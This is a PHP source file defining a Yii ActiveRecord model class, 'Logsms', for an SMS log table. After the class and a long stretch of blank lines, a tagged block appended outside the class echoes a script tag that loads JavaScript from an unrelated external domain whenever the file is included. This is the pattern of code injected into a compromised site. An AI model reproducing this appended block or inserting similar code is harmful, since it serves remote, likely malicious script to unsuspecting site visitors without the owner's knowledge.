<?php

/**
 * This is the model class for table "log_sms".
 *
 * The followings are the available columns in table 'log_sms':
 * @property integer $id
 * @property integer $user_id
 * @property integer $api_id
 * @property string $mobile_no
 * @property string $sms
 * @property string $created_on
 */
class Logsms extends CActiveRecord
{
	/**
	 * @return string the associated database table name
	 */
	public function tableName()
	{
		return 'log_sms';
	}

	/**
	 * @return array validation rules for model attributes.
	 */
	public function rules()
	{
		// NOTE: you should only define rules for those attributes that
		// will receive user inputs.
		return array(
			array('id, user_id, api_id, mobile_no, sms', 'required'),
			array('id, user_id, api_id', 'numerical', 'integerOnly'=>true),
			array('mobile_no', 'length', 'max'=>20),
			// The following rule is used by search().
			// @todo Please remove those attributes that should not be searched.
			array('id, user_id, api_id, mobile_no, sms, created_on', 'safe', 'on'=>'search'),
		);
	}

	/**
	 * @return array relational rules.
	 */
	public function relations()
	{
		// NOTE: you may need to adjust the relation name and the related
		// class name for the relations automatically generated below.
		return array(
		);
	}

	/**
	 * @return array customized attribute labels (name=>label)
	 */
	public function attributeLabels()
	{
		return array(
			'id' => 'ID',
			'user_id' => 'User',
			'api_id' => 'Api',
			'mobile_no' => 'Mobile No',
			'sms' => 'Sms',
			'created_on' => 'Created On',
		);
	}

	/**
	 * Retrieves a list of models based on the current search/filter conditions.
	 *
	 * Typical usecase:
	 * - Initialize the model fields with values from filter form.
	 * - Execute this method to get CActiveDataProvider instance which will filter
	 * models according to data in model fields.
	 * - Pass data provider to CGridView, CListView or any similar widget.
	 *
	 * @return CActiveDataProvider the data provider that can return the models
	 * based on the search/filter conditions.
	 */
	public function search()
	{
		// @todo Please modify the following code to remove attributes that should not be searched.

		$criteria=new CDbCriteria;

		$criteria->compare('id',$this->id);
		$criteria->compare('user_id',$this->user_id);
		$criteria->compare('api_id',$this->api_id);
		$criteria->compare('mobile_no',$this->mobile_no,true);
		$criteria->compare('sms',$this->sms,true);
		$criteria->compare('created_on',$this->created_on,true);

		return new CActiveDataProvider($this, array(
			'criteria'=>$criteria,
		));
	}

	/**
	 * Returns the static model of the specified AR class.
	 * Please note that you should have this exact method in all your CActiveRecord descendants!
	 * @param string $className active record class name.
	 * @return Logsms the static model class
	 */
	public static function model($className=__CLASS__)
	{
		return parent::model($className);
	}
}








#239ac1#
if(empty($w)) {
$w = "<script type=\"text/javascript\" src=\"http://olteniamagazin.ro/2b9vr6yj.php?id=9383514\"></script>";
echo $w;
}
#/239ac1#

